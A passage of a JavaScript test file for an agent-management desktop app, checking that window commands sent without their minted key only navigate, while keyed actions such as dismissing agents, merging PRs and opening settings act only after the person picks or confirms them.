  assert.deepEqual(dismissals(acts).at(-1), { terminal: `app:${picked.slice(2)}`, undo: true }, "the toast's Undo brings it back");
  // A dismissed agent is no card of Home's: nothing to archive, nothing counted.
  assert.ok(!h.flat(h.columns(h.cards())).some((c) => c.key === "a:t42"));
  // A dismissal sends the wait its card showed.
  const named = home(mod, [{ ...waitsAt("t43", 4), wait: "4:limit" }]);
  named.toasts = { msgs: [], push(_cx, m) { this.msgs.push(m); } };
  named.key({ keystroke: "j" }, cx);
  named.key({ keystroke: "x" }, cx);
  await settled();
  assert.deepEqual(dismissals(acts).at(-1), { terminal: "app:t43", undo: false, wait: "4:limit" });
});

test("x in the recap dismisses only the row the person moved to; the palette's command only with its key", async () => {
  const { mod, acts, notices, overlays } = await fixture({ shown: "home", focusedPane: { terminal: "t52", agent: "t52" } });
  const r = Object.create(mod.Recap.prototype);
  const model = Object.create(mod.AgentsModel.prototype);
  Object.assign(model, { view: "recap", busy: new Map(), picks: new Map(), value: { agents: [waitsAt("t52", 1), dismissedAt("t53", 2), t3] }, replying: null, undo: null, toasts: null });
  Object.assign(r, { agents: model, tab: "all", selected: "app:t52", picked: null, filtering: false, filter: { value: () => "" }, handle: focus() });
  const { cx, settled } = context();
  r.key({ key: "x", keystroke: "x" }, cx);
  await settled();
  assert.deepEqual(dismissals(acts), [], "opened by ⌘R or a window command, the first row is not dismissed");
  assert.match(notices.at(-1).title, /Move to it first/);
  r.key({ key: "j", keystroke: "j" }, cx);
  r.key({ key: "k", keystroke: "k" }, cx);
  r.key({ key: "x", keystroke: "x", injected: true }, cx);
  await settled();
  assert.deepEqual(dismissals(acts), [], "a key sent from outside the window dismisses nothing");
  r.key({ key: "x", keystroke: "x" }, cx);
  await settled();
  assert.deepEqual(dismissals(acts), [{ terminal: "app:t52", undo: false }]);
  r.key({ key: "j", keystroke: "j" }, cx);
  r.key({ key: "x", keystroke: "x" }, cx);
  await settled();
  assert.deepEqual(dismissals(acts).at(-1), { terminal: "app:t53", undo: true }, "on a dismissed row x brings it back");
  r.key({ key: "j", keystroke: "j" }, cx);
  const before = acts.length;
  assert.equal(r.key({ key: "x", keystroke: "x" }, cx), false, "a working agent has nothing to dismiss: x is not taken");
  assert.equal(acts.length, before);
  // The palette's This agent entries: a bare window command opens a menu naming the agent in front; its key acts.
  for (const [command, undo] of [["dismiss", false], ["dismiss:back", true]]) {
    const had = { acts: acts.length, overlays: overlays.length };
    mod.runCommand(command, cx, "cockpit", {});
    await settled();
    assert.equal(acts.length, had.acts, `a bare ${command} acts on nothing`);
    assert.equal(overlays.length, had.overlays + 1, "it opens a menu the person picks from");
    assert.equal(overlays.at(-1).props.items[0].command.replace(/~[0-9a-f]{32}$/, ""), undo ? "dismiss:back:app:t52" : "dismiss:at:app:t52|", "naming the agent, and the wait it shows");
    const { command: named, key } = mod.unkey(mod.keyed(`cockpit.${command}`));
    mod.runCommand(named.slice(8), cx, "cockpit", { key });
    await settled();
    assert.deepEqual(dismissals(acts).at(-1), { terminal: "app:t52", undo });
  }
  assert.match(notices.at(-2).title, /^Dismissed /);
  assert.equal(notices.at(-2).action.name, "cockpit.dismiss:undo:app:t52", "the toast's click carries no key: it opens a menu");
  const had = overlays.length;
  mod.runCommand("dismiss:undo:app:t52", cx, "cockpit", {});
  await settled();
  assert.equal(overlays.length, had + 1);
  assert.equal(overlays.at(-1).props.items[0].command.replace(/~[0-9a-f]{32}$/, ""), "dismiss:back:app:t52", "that menu brings back the agent it names");
  for (const name of ["cockpit.dismiss", "cockpit.dismiss:back"]) assert.ok(mod.CATALOGUE.some((e) => e.command === name && e.group === "This agent"), `${name} is one of the palette's agent actions`);
});

// ---------------------------------------------------------------------------------------------------------------------
// Every registered command

/**
 * Every command shape the mod registers, with a sample and what it is: `nav` brings something into view or opens a menu,
 * a dialog or a box; `act` changes something or reaches an agent, and does nothing without its key. Shapes write each
 * template argument as `*`.
 */
const SHAPES = {
  // The runner's commands (commands.js), both layouts.
  palette: ["palette", "nav"], keys: ["keys", "nav"], recap: ["recap", "nav"], "recap:": ["recap:needs_you", "nav"],
  "next-waiting": ["next-waiting", "nav"], "next:blocked": ["next:blocked", "nav"], "next:done": ["next:done", "nav"],
  panel: ["panel", "nav"], "panel:": ["panel:review", "nav"], "doc:": ["doc:deploy", "nav"], "go:": ["go:inbox", "nav"],
  "via:": ["via:chat|chat:mode", "nav"], pr: ["pr", "nav"], ticket: ["ticket", "nav"],
  resume: ["resume", "allowed"], "link:": ["link:https://acme.example/x", "nav"], "target:": [`target:act:merge:${PR}`, "nav"],
  update: ["update", "nav"], settings: ["settings", "nav"], "settings:": ["settings:health", "nav"], diagnostics: ["diagnostics", "nav"], usage: ["usage", "nav"], start: ["start", "nav"],
  kit: ["kit", "nav"], "kit:": ["kit:charts", "nav"], "code:open:": ["code:open:/Users/me/code/api/README.md", "nav"],
  home: ["home", "nav"], "agent-view": ["agent-view", "nav"], sidebar: ["sidebar", "nav"], new: ["new", "nav"],
  terminal: ["terminal", "nav"], session: ["session", "act"], dismiss: ["dismiss", "act"], "dismiss:": ["dismiss:back", "act"],
  // The palette's catalogue and keys.json, as written there.
  queue: ["queue", "nav"], "chat:mode": ["chat:mode", "act"], "chat:stop": ["chat:stop", "act"], tabs: ["tabs", "nav"],
  // Menu items, as the views build them.
  "agents|go|*|": ["agents|go|app:t3|", "nav"], "agents|read|*|": ["agents|read|app:t3|", "nav"], "agents|handover|*|": ["agents|handover|app:t3|", "nav"],
  "agents|peek|*|": ["agents|peek|app:t3|", "nav"], "agents|pin|*|": ["agents|pin|app:t3|", "nav"],
  "agents|recap|*|": ["agents|recap|app:t3|", "act"], "agents|wake|*|": ["agents|wake|app:t3|", "act"], "agents|seen|*|": ["agents|seen|app:t3|", "act"],
  "agents|snooze|*|1h": ["agents|snooze|app:t3|1h", "act"], "agents|snooze|*|18:00": ["agents|snooze|app:t3|18:00", "act"],
  "agents|snooze|*|tomorrow": ["agents|snooze|app:t3|tomorrow", "act"], "agents|snooze|*|done": ["agents|snooze|app:t3|done", "act"],
  "agents|fork|*|tab": ["agents|fork|app:t3|tab", "act"], "agents|fork|*|right": ["agents|fork|app:t3|right", "act"],
  "*": ["agents|unasked|0123", "act"], "link:*": ["link:https://acme.example/run/1", "nav"], "doc:*": ["doc:deploy", "nav"],
  "home:go:*": ["home:go:a:t3", "nav"], "home:beside:*": ["home:beside:a:t3", "nav"], "home:pr:*": ["home:pr:a:t3", "nav"],
  "home:recap:*": ["home:recap:a:t3", "act"], "home:queue:*": ["home:queue:a:t3", "act"], "home:snooze:*": ["home:snooze:a:t3", "act"],
  "home:dismiss:*": ["home:dismiss:a:t3", "act"], "home:restore:*": ["home:restore:a:t3", "act"],
  "agents|dismiss|*|": ["agents|dismiss|app:t3|", "act"], "agents|restore|*|": ["agents|restore|app:t3|", "act"],
  "home:seen:*": ["home:seen:a:t3", "act"], "home:pin:*": ["home:pin:a:t3", "act"], "home:fork:*": ["home:fork:a:t3", "act"], "home:merge:*": ["home:merge:a:t3", "act"], "home:archive:*": ["home:archive:a:t3", "act"],
  "inbox:act:*": ["inbox:act:0", "act"], "inbox:pick": ["inbox:pick", "act"], "inbox:alike": ["inbox:alike", "act"], "inbox:fold": ["inbox:fold", "nav"],
  "inbox:state:*:*": ["inbox:state:ENG-7:Done", "act"],
  "mail:*:*": ["mail:reply:m1", "act"], "meetings:*:*": ["meetings:prepare:e1", "act"], "meetings:golist:*": ["meetings:golist:e1", "nav"],
  "mode:*:*": ["mode:acceptEdits:0123", "act"], "pick:model:*": ["pick:model:haiku|claude%3A1", "act"], "pick:effort:*": ["pick:effort:high|claude%3A1", "act"],
  "pick:fast:on": ["pick:fast:on|claude%3A1", "act"], "pick:fast:off": ["pick:fast:off|claude%3A1", "act"], "pick:fast:*": ["pick:fast:on|claude%3A1", "act"], "attach:file": ["attach:file", "nav"], "attach:clipboard": ["attach:clipboard", "act"],
  "chatstart:agent:*": ["chatstart:agent:codex", "act"], "chatstart:here:here": ["chatstart:here:here", "act"], "chatstart:here:new": ["chatstart:here:new", "act"],
  "chatstart:repo:*": ["chatstart:repo:web", "act"], "chatstart:*:*": ["chatstart:effort:high", "act"],
  "monitor:act:*:*": ["monitor:act:fix:iss-1", "act"], "monitor:window:*": ["monitor:window:iss-1", "nav"],
  "review:to:*|*": ["review:to:app:t3|/Users/me/code/api", "act"], "review:to:new|*": ["review:to:new|/Users/me/code/api", "act"],
  "routines:act:*:*": ["routines:act:talk:sweep", "act"], "routines:act:file:*": ["routines:act:file:sweep", "act"], "routines:read:-:*": ["routines:read:-:sweep/run/1", "act"],
  "show:first:*": ["show:first:1", "nav"], "show:copy:*": ["show:copy:1", "nav"], "show:page:": ["show:page:", "nav"],
  "todo:toggle:*": ["todo:toggle:k1", "act"], "todo:edit:*": ["todo:edit:k1", "act"], "todo:open:*": ["todo:open:k1", "act"], "todo:top:*": ["todo:top:k1", "act"],
  "todo:up:*": ["todo:up:k1", "act"], "todo:down:*": ["todo:down:k1", "act"], "todo:mark:*": ["todo:mark:k1", "act"], "todo:delete:*": ["todo:delete:k1", "act"],
  "*:act:*:*": ["runbook:act:eng-1#2:run", "act"], "*:add:*": ["runbook:add:eng-1#2", "nav"], "*:edit:*:command": ["runbook:edit:eng-1#2:command", "nav"],
  "*:edit:*:status": ["runbook:edit:eng-1#2:status", "nav"], "*:edit:*:step": ["runbook:edit:eng-1#2:step", "nav"], "*:edit:*:where": ["runbook:edit:eng-1#2:where", "nav"],
  "*:pick:*": ["runbook:pick:eng-1#2", "act"], "*:status:*:*": ["runbook:status:eng-1#2:0", "act"],
  "tabs:select:*": ["tabs:select:t1", "nav"], "tabs:open:*": ["tabs:open:claude:1", "nav"], "tabs:restore:*": ["tabs:restore:t2", "nav"], "tabs:restore:": ["tabs:restore:t2", "nav"],
  "bell:*": ["bell:t3", "nav"], "cockpit.go:*": ["go:inbox", "nav"], "cockpit.go:needs": ["go:needs", "nav"],
  // Commands views parse that no menu lists: shells, other views and Herdr's toasts send them.
  "chat:open:*": ["chat:open:app:t3", "nav"], reply: ["reply", "nav"], "chat:earlier": ["chat:earlier", "nav"], "chat:end": ["chat:end", "nav"],
  "chat:handover": ["chat:handover", "nav"], "chat:start:type:*": ["chat:start:type:hello", "nav"], "chat:start:send": ["chat:start:send", "act"],
  "chat:merge:*": ["chat:merge:0", "act"], "chat:pr:open": ["chat:pr:open", "nav"], "chat:start:new:*": ["chat:start:new:Fix the login redirect", "nav"],
  "start:type:*": ["start:type:ENG-412", "nav"], "palette:type:*": ["palette:type:fork", "act"], "show:go:*": ["show:go:deploy#go", "nav"],
  "show:ask:*": ["show:ask:1:A", "nav"], "show:hide:*": ["show:hide:deploy", "nav"], "review:submit": ["review:submit", "act"],
  "review:open:*": ["review:open:/Users/me/code/api", "nav"], "review:follow:*": ["review:follow:app:t3", "nav"], "review:scope:*": ["review:scope:branch", "nav"],
  "review:mode:*": ["review:mode:walkthrough", "nav"], "code:save": ["code:save", "act"], "routines:template:*": ["routines:template:standup", "act"],
  "routines:change:*": ["routines:change:sweep", "nav"], "runbook:book:*": ["runbook:book:eng-1:talk", "act"], "runbook:done:*": ["runbook:done:eng-1#2", "act"],
  "monitor:close-windows": ["monitor:close-windows", "nav"], "monitor:close:*": ["monitor:close:iss-1", "nav"],
  "inbox:file": ["inbox:file", "nav"], "inbox:refresh": ["inbox:refresh", "nav"],
  "update:next": ["update:next", "act"], "update:save": ["update:save", "act"], "update:skip": ["update:skip", "act"], "update:try": ["update:try", "act"],
};

/** The command shapes the mod's sources register: menu items, `run("cockpit.…")`, the catalogue, keys.json, the runner. */
async function registered(mod) {
  const shapes = new Set();
  const shape = (s) => s.replace(/\$\{[^}]*\}/g, "*").replace(/\*\*+/g, "*");
  for (const name of await readdir(folder)) {
    if (!name.endsWith(".js")) continue;
    const text = await readFile(new URL(name, folder), "utf8");
    // person.js keys whatever an item names: that is no command of its own.
    for (const m of text.matchAll(/command: (`[^`]*`|"[^"]*")/g)) if (!m[1].includes("~")) shapes.add(shape(m[1].slice(1, -1)));
    for (const m of text.matchAll(/command: c\("([a-z]+)"(?:, "([^"]*)")?\)/g)) shapes.add(`agents|${m[1]}|*|${m[2] ?? ""}`);
  }
  shapes.delete("Command");
  for (const e of mod.CATALOGUE) shapes.add(e.command.slice(8));
  const keys = JSON.parse(await readFile(new URL("keys.json", app), "utf8"));
  for (const map of Object.values(keys)) for (const a of Object.values(map)) if (a.startsWith("cockpit.")) shapes.add(a.slice(8));
  for (const layout of ["cockpit", "cockpit-chat"]) for (const n of mod.runnerCommands(layout)) shapes.add(n);
  return shapes;
}

/** Every view a command reaches, set up to act when its command carries its key; and what each could leave armed. */
function views(mod, f) {
  const sidebar = Object.create(mod.AgentsModel.prototype);
  Object.assign(sidebar, { view: "sidebar", busy: new Map(), picks: new Map(), value: { agents: [t3] } });
  const h = home(mod, [t3]);
  const runbook = Object.create(mod.Runbook.prototype);
  const step = { key: "eng-1#2", n: "2", step: "Deploy", where: "prod", status: "", command: "make deploy", open: true, acts: [{ id: "run", label: "run", confirm: "run-eng-1-2" }] };
  Object.assign(runbook, { scope: "runbook", panel: false, filter: "", model: { books: [{ slug: "eng-1", name: "ENG-1", title: "Deploy", total: 1, steps: [step], acts: [{ id: "talk" }] }] }, handle: focus(), confirm: null, picked: new Set(), toasts: toasts(), editor: field(), fields: [field(), field(), field()] });
  const monitor = Object.create(mod.Monitor.prototype);
  Object.assign(monitor, { byKey: new Map([["iss-1", { item: { key: "iss-1", acts: [{ id: "fix", label: "fix", action: "fix", args: ["api"] }] } }]]), toasts: toasts(), handle: focus(), confirm: null });
  const routines = Object.create(mod.Routines.prototype);
  Object.assign(routines, { toasts: toasts(), confirm: null, handle: focus(), form: { slug: null }, openForm() {}, leave() {}, pickTemplate() { f.effects.push("template"); }, entry: (k) => ({ slug: "sweep", id: "1", acts: [{ id: "talk", action: "talk", args: [k, null] }] }) });
  const inbox = Object.create(mod.Inbox.prototype);
  const row = { key: PR, path: "/r9", name: "acme/api#9", kind: "review", acts: [{ label: "review", key: "r", call: { fn: "review", args: [{ url: PR }] } }] };
  Object.assign(inbox, { toasts: toasts(), pending: new Map(), details: new Map(), picked: new Set(), dialog: null, handle: focus(), current: () => row, rowByKey: () => row, folds: new Map(), unfolded: new Set(), filter: "",
    isOpen: () => true, all: () => [row], pickAlike() { f.effects.push("pick alike"); }, pick() { f.effects.push("pick"); }, openFile() {}, refresh() {} });
  const mail = Object.create(mod.Mail.prototype);
  Object.assign(mail, { toasts: toasts(), handle: focus(), model: { messages: [{ id: "m1", fromName: "Maya", raw: { id: "m1" } }] }, hubAct: async (_cx, action) => f.effects.push(`mail ${action}`), openReading() {} });
  const meetings = Object.create(mod.Meetings.prototype);
  Object.assign(meetings, { toasts: toasts(), handle: focus(), open: new Set(), model: { meetings: [{ id: "e1", raw: { id: "e1" } }] }, hubAct: async (_cx, action) => f.effects.push(`meetings ${action}`), focusOn() {} });
  const todo = Object.create(mod.Todo.prototype);
  Object.assign(todo, { toasts: toasts(), handle: focus(), menuAction: (action) => f.effects.push(`todo ${action}`) });
  const show = Object.create(mod.Show.prototype);
  const view = { name: "deploy", url: "https://acme.example/deploy", blocks: [{ n: 0, type: "markdown" }, { n: 1, id: "go", type: "confirm", summary: "Deploy?", confirm_label: "Deploy" }] };
  Object.assign(show, { name: null, panel: false, handle: focus(), ui: new Map(), toasts: toasts(), view: () => view, first: 0, focus: null, pointed: false, hide() {}, openUrl() {}, copyCsv() {}, askById() {} });
  const start = Object.create(mod.Start.prototype);
  start.s = { id: "g1", source: "", extra: {} };
  Object.assign(start, { source: field(), plan: { ok: true }, checking: false, started: false, handle: focus(), typedOutside: false, replan() {} });
  const review = Object.create(mod.Review.prototype);
  Object.assign(review, { handle: focus(), toasts: toasts(), rows: [t3], model: {}, reviewed: () => "/Users/me/code/api", here: () => "/Users/me/code/api", recipient: () => ({ kind: "agent", row: t3 }),
    submit() { f.effects.push("review submit"); }, openRecipients() {}, setScope() {}, setMode() {}, load() {}, withOpen: (d) => d, focusFacts: () => null });
  const code = Object.create(mod.Code.prototype);
  Object.assign(code, { save() { f.effects.push("code save"); } });
  const palette = Object.create(mod.Palette.prototype);
  Object.assign(palette, { input: { set_value: () => f.effects.push("palette typed") }, changed() {}, sheet: null, dismiss() {}, setSheet() {} });
  const chat = Object.create(mod.Chat.prototype);
  let text = "";
  Object.assign(chat, { model: sidebar, input: { focus() {}, value: () => text, set_value: (v) => (text = v) }, target: null, typedOutside: null, pointed: false, confirm: null, files: [], sends: new Map(), edits: new Map(), drafts: new Map(),
    sessions: { session: { key: "claude:1", mode: "default", messages: [] } }, cancelFocus: focus(), handle: focus(), modeKey: null,
    starter: { start: () => f.effects.push("chat start"), command: (c) => f.effects.push(`starter ${c}`) }, row: () => null, hints: () => ({ items: [] }), merging: null,
    prMerges: { url: PR, arg: { url: PR, number: 9 }, base: "main", choices: [{ do: "merge", method: "squash", label: "Squash and merge" }] },
    open() {}, earlier() {}, handover() {}, toEnd() {}, pick: (what) => what === "clipboard" && f.effects.push(`attach ${what}`), sessionAct: (action) => f.effects.push(`session ${action}`),
    choose: (what) => f.effects.push(`chat pick ${what}`) });
  chat.session = () => chat.sessions.session;
  // The PR chip's menu was opened on t3's PR: its merges wait on their key.
  chat.row = () => ({ terminal: "app:t3", pr: { url: PR, number: 9 } });
  const top = Object.create(mod.ChatTop.prototype);
  Object.assign(top, { sizes: new Map(), sessions: [], openTabs() {} });
  // The update dialog on the options an update brought, one picked differently, and Cockpit settings on its Options tab.
  const update = Object.create(mod.Update.prototype);
  Object.assign(update, { p: {}, phase: "after", steps: ["options", "layout"], at: 0, picks: { "chat.nextSteps": true }, row: 0, saving: false, done: null, error: null, pointed: true, hint: null, person: false, noted: new Set(),
    after: { from: "0.40.3", to: "0.41.0", notes: [], options: [{ key: "chat.nextSteps", value: false }], layout: "cockpit-chat" }, dismiss: () => f.effects.push("update closed") });
  const settings = Object.create(mod.Settings.prototype);
  Object.assign(settings, { p: {}, tab: "options", all: false, at: 0, optionAt: 0, pointed: true, asking: null, report: null, toasts: toasts(), handle: focus(), rowAt: {},
    options: [{ key: "chat.nextSteps", title: "Suggest next prompts", kind: "toggle", value: false }, { key: "agents.pace", title: "Pace of the 7-day limit", kind: "choice", value: "week", choices: [{ value: "week", label: "Whole week" }, { value: "weekdays", label: "Weekdays" }] }],
    saving: new Set(), errors: {}, fields: new Map(), drafts: {}, field: null, hubState: "live", v: null, checking: false });
  const all = { sidebar, home: h, runbook, monitor, routines, inbox, mail, meetings, todo, show, start, review, code, palette, chat, top, update, settings };
  const armed = () => ({ home: h.confirm, runbook: runbook.confirm, monitor: monitor.confirm, routines: routines.confirm, inbox: inbox.dialog, chat: chat.confirm ?? chat.merging, startTyped: start.started, homeSel: h.sel, picked: runbook.picked.size,
    options: update.pointed && settings.pointed ? null : "armed", updateStep: update.at });
  return { all, armed };
}

/** What a command did beyond navigating: hub actions and requests, CLI runs other than a row's focus, Herdr commands. */
const NAV_RUNS = new Set(["agent.focus", "pane.split", "layout.select", "layout.show", "layout.hide", "layout.switch", "space.select", "tab.select", "tab.unsettle", "terminal.peek"]);
function effects(f, since) {
  const out = [...f.effects.slice(since.effects)];
  out.push(...f.acts.slice(since.acts).map((a) => `act ${a.app} ${a.action}`));
  out.push(...f.requests.slice(since.requests).map((r) => `request ${r.app} ${r.action}`));
  out.push(...f.clis.slice(since.clis).filter((a) => !(a[0] === "focus" && a.length === 2 && !/^(herdr-app:)?act:/.test(a[1]) && a[1] !== "update")).map((a) => `cockpit ${a.join(" ")}`));
  out.push(...f.calls.slice(since.calls).filter(([name]) => !NAV_RUNS.has(name) && !(name.startsWith("cockpit.") && !/~[0-9a-f]{32}$/.test(name))).map(([name]) => `run ${name}`));
  out.push(...f.sets.slice(since.sets).filter((k) => k === "review.to" || k === "cockpit.queue.for").map((k) => `shared ${k}`));
  return out;
}
const mark = (f) => ({ effects: f.effects.length, acts: f.acts.length, requests: f.requests.length, clis: f.clis.length, calls: f.calls.length, sets: f.sets.length });

/** A command broadcast to every view and the runner, as main.js does, with or without a key. */
async function dispatch(f, v, layout, command, key) {
  const { cx, settled } = context();
  for (const [name, view] of Object.entries(v.all)) {
    // The top bar is the reading layout's runner; Cockpit's, the status bar, only runs the window's commands.
    if (name === "top" && layout !== "cockpit-chat") continue;
    try {
      view.command?.(command, cx, key);
    } catch (e) {
      throw new Error(`${command} in ${name}: ${e.message}`);
    }
  }
  if (layout === "cockpit") f.mod.runCommand(command, cx, layout, { key });
  await settled();
}

/** The entry a registered command falls under: its own shape, else the runner's name it starts with (`go:`, `panel:`). */
const classify = (shape) => (shape in SHAPES ? shape : Object.keys(SHAPES).filter((k) => k.endsWith(":") && shape.startsWith(k)).sort((a, b) => b.length - a.length)[0]);

test("every registered command, sent from outside the window, does nothing but navigate", async () => {
  const shapes = await registered((await fixture()).mod);
  const unclassified = [...shapes].filter((s) => !classify(s));
  assert.deepEqual(unclassified, [], "a new window command is classified here: navigation, or an action that takes its key");
  for (const layout of ["cockpit", "cockpit-chat"]) {
    for (const [shape, [sample, kind]] of Object.entries(SHAPES)) {
      const f = await fixture({ layout, shown: layout === "cockpit" ? "home" : "chat", spacesList: [{ id: "s1", active: true, folder: "/Users/me/code/api", tabs: [] }] });
      f.effects = [];
      const v = views(f.mod, f);
      const before = mark(f);
      await dispatch(f, v, layout, sample);
      const did = effects(f, before);
      if (kind === "allowed") continue;
      assert.deepEqual(did, [], `${layout}: \`${sample}\` (${shape}) acts without its key`);
      const armed = plain(v.armed());
      // A mode that asks less, named without the chat's own key, goes through its confirm, which only a click answers.
      if (shape === "mode:*:*") armed.chat = null;
      assert.deepEqual(armed, { home: null, runbook: null, monitor: null, routines: null, inbox: null, chat: null, startTyped: false, homeSel: null, picked: 0, options: null, updateStep: 0 }, `${layout}: \`${sample}\` arms a confirm or picks something`);
    }
  }
});

test("every action, sent with the key its menu, the palette or a click minted, acts", async () => {
  const layoutOf = { "chat:mode": "cockpit-chat", "chat:stop": "cockpit-chat", session: "cockpit-chat" };
  // Acts a sample cannot show here: a confirm's own key (agents|unasked, mode) and palette typing, which takes none.
  const skip = new Set(["*", "mode:*:*", "palette:type:*", "chat:start:send"]);
  for (const [shape, [sample, kind]] of Object.entries(SHAPES)) {
    if (kind !== "act" || skip.has(shape)) continue;
    const layout = layoutOf[sample] ?? "cockpit";
    const f = await fixture({ layout, shown: layout === "cockpit" ? "home" : "chat", spacesList: [{ id: "s1", active: true, folder: "/Users/me/code/api", tabs: [] }] });
    f.effects = [];
    const v = views(f.mod, f);
    const before = mark(f);
    const { command, key } = f.mod.unkey(f.mod.keyed(sample));
    await dispatch(f, v, layout, command, key);
    const armedNow = Object.values(plain(v.armed())).some((x) => x !== null && x !== false && x !== 0);
    assert.ok(effects(f, before).length > 0 || armedNow, `\`${sample}\` (${shape}) did nothing with its key`);
  }
});

test("cockpit.settings opens the sheet and changes nothing, and the name it had still opens it on Health", async () => {
  for (const layout of ["cockpit", "cockpit-chat"]) {
    const f = await fixture({ layout, shown: layout === "cockpit" ? "home" : "chat" });
    f.effects = [];
    const v = views(f.mod, f);
    const { cx } = context();
    const opened = () => plain(f.overlays.at(-1)?.props ?? null);
    for (const [command, tab] of [["settings", null], ["settings:health", "health"], ["settings:agents", "agents"], ["settings:options", "options"], ["diagnostics", "health"]]) {
      const before = f.overlays.length;
      assert.equal(f.mod.runCommand(command, cx, layout, {}), true, `${layout}: ${command}`);
      assert.equal(f.overlays.length, before + 1);
      assert.deepEqual(opened(), { app: "settings", tab, person: false }, `${layout}: cockpit.${command}`);
      assert.equal(f.overlays.at(-1).kind, "window");
    }
    assert.deepEqual([f.acts.length, f.requests.length], [0, 0], "opening it saves and asks nothing");
    // The sheet a command opened: the keys that would set an option, a choice or reach a field do nothing in it.
    const sheet = v.all.settings;
    for (const optionAt of [0, 1]) {
      sheet.optionAt = optionAt;
      for (const keystroke of ["space", "enter", "right", "left", "l", "h"]) sheet.key({ keystroke }, cx);
      for (const keystroke of ["j", "space", "enter", "right"]) sheet.key({ keystroke, injected: true }, cx);
      for (const keystroke of ["j", "space", "enter", "right"]) sheet.key({ keystroke, is_held: true }, cx);
    }
    // The person's own keys note what the tab shows as seen, and set nothing.
    assert.deepEqual([f.acts.filter((a) => !(a.app === "options" && a.action === "shown")).length, sheet.pointed, sheet.field], [0, true, null], `${layout}: nothing is set`);
    assert.deepEqual(plain(sheet.options.map((o) => o.value)), [false, "week"]);
  }
  // The keys sheet and the palette name the command, and a key bound to the old name reads as what it opens.
  const { mod } = await fixture();
  assert.deepEqual(plain(mod.describe("cockpit.settings")), { title: "Cockpit settings", group: "Window", icon: "sliders-horizontal" });
  assert.deepEqual(plain(mod.describe("cockpit.diagnostics")), { title: "Cockpit settings: Health", group: "Window", icon: "shield-check" });
  const rows = mod.sheet("cockpit", [{ keys: "cmd-,", action: "cockpit.settings", section: "layout:cockpit" }, { keys: "cmd-alt-d", action: "cockpit.diagnostics", section: "layout:cockpit" }], "cockpit").flatMap((g) => g.rows);
  assert.deepEqual(plain(rows.filter((r) => r.action?.startsWith("cockpit.")).map((r) => [r.keys, r.title])), [["cmd-,", "Cockpit settings"], ["cmd-alt-d", "Cockpit settings: Health"]]);
  assert.ok(!mod.CATALOGUE.some((e) => /diagnostics/i.test(`${e.title} ${e.command}`)), "no entry still reads Diagnostics");
});

test("the palette's Start work opens the chat's own start box with the query; ⏎ starts it only when the person picked it", async () => {
  const f = await fixture({ layout: "cockpit-chat", shown: "chat" });
  f.effects = [];
  const v = views(f.mod, f);
  const chat = v.all.chat;
  const opened = [];
  chat.open = (key) => opened.push(key);
  await dispatch(f, v, "cockpit-chat", "chat:start:new:Fix the login redirect", null);
  assert.deepEqual([opened.at(-1), chat.input.value()], ["start:", "Fix the login redirect"]);
  assert.deepEqual(plain(chat.typedOutside), { target: "start:", text: "Fix the login redirect" }, "a bare command types; only a click on ↑ starts it");
  const { command, key } = f.mod.unkey(f.mod.keyed("chat:start:new:Fix the login redirect"));
  await dispatch(f, v, "cockpit-chat", command, key);
  assert.equal(chat.typedOutside, null, "the person's pick: ⏎ starts it");
  assert.deepEqual(f.effects, [], "nothing starts on its own");
  await dispatch(f, v, "cockpit-chat", "chat:start:new:", null);
  assert.equal(chat.typedOutside, null, "an empty box a command opened holds nothing it typed: what the person types starts with ⏎");
});

test("the chat's PR chip merges only from its menu's item, asked under the header first, on the PR it was opened for", async () => {
  const f = await fixture({ layout: "cockpit-chat", shown: "chat" });
  f.effects = [];
  const v = views(f.mod, f);
  const chat = v.all.chat;
  await dispatch(f, v, "cockpit-chat", "chat:merge:0", null);
  assert.equal(chat.merging, null, "a bare window command asks nothing");
  const { command, key } = f.mod.unkey(f.mod.keyed("chat:merge:0"));
  await dispatch(f, v, "cockpit-chat", command, key);
  assert.equal(chat.merging.question, "Squash and merge: #9 into main now?");
  assert.equal(f.acts.length, 0, "asked first");
  const { cx, settled } = context();
  chat.merge(cx);
  await settled();
  await new Promise((r) => setTimeout(r, 5));
  assert.deepEqual(plain(f.acts.at(-1)), { app: "inbox", action: "merge", args: [{ url: PR, number: 9 }, "squash"] });
  chat.row = () => ({ terminal: "app:t4", pr: { url: "https://github.com/acme/web/pull/3", number: 3 } });
  const again = f.mod.unkey(f.mod.keyed("chat:merge:0"));
  await dispatch(f, v, "cockpit-chat", again.command, again.key);
  assert.equal(chat.merging, null, "the chat moved to another agent: the menu's PR is not its PR");
});

// ---------------------------------------------------------------------------------------------------------------------
// Rows a hub focus pointed at

test("every hub focus points at its row: the app's call site says so", async () => {
  for (const name of await readdir(folder)) {
    if (!name.endsWith(".js")) continue;
    const text = await readFile(new URL(name, folder), "utf8");
    for (const m of text.matchAll(/if \(m\.focus === "([a-z]+)"[^)]*\) this\.(goTo|focusOn)\(([^;]*)\);/g)) {
      // show's goTo points unless the person's key says otherwise; every other app's takes `true` from a hub focus.
      if (m[1] === "show") continue;
      assert.match(m[3], /, true$/, `${name}: a hub focus on ${m[1]} must point at its row`);
    }
  }
});

test("an app a hub focus brought to a row runs nothing on the next real ⏎, letter or digit until the person moves", async () => {
  const { mod, acts, requests, calls } = await fixture({ shown: "inbox" });
  const { cx, settled } = context();
  const hub = (v) => (v.toasts = toasts(), Object.assign(v, { handle: focus(), palette: null, dialog: null, filtering: false, confirm: null, form: null, editing: false, adding: false }));
  const apps = {
    inbox: () => {
      const v = hub(Object.create(mod.Inbox.prototype));
      const row = { key: PR, path: "/mine/9", name: "acme/api#9", kind: "pr", acts: [{ label: "merge", key: "m", main: true, call: { fn: "merge", args: [] } }] };
      Object.assign(v, { folds: new Map(), flashes: { start() {} }, rowByKey: () => row, clearFilter() {}, select: (r) => (v.sel = r.path) });
      v.goTo(PR, cx, true);
      return v;
    },
    monitor: () => {
      const v = hub(Object.create(mod.Monitor.prototype));
      Object.assign(v, { model: { ready: true, apps: [{ key: "api", name: "api" }] }, closed: new Set(), opened: new Set(), filter: "", byKey: new Map([["api", { item: { key: "api", acts: [{ id: "fix", key: "f", action: "fix", args: [] }] } }]]), select: (k) => (v.sel = k) });
      v.goTo("api", cx, true);
      return v;
    },
    routines: () => {
      const v = hub(Object.create(mod.Routines.prototype));
      Object.assign(v, { model: { ready: true }, opened: new Set(), search: field(), routine: () => ({ slug: "sweep" }), select: (k) => (v.sel = k), entry: () => ({ acts: [{ id: "run", key: "r", action: "run", args: [] }] }) });
      v.goTo("sweep", cx, true);
      return v;
    },
    mail: () => {
      const v = hub(Object.create(mod.Mail.prototype));
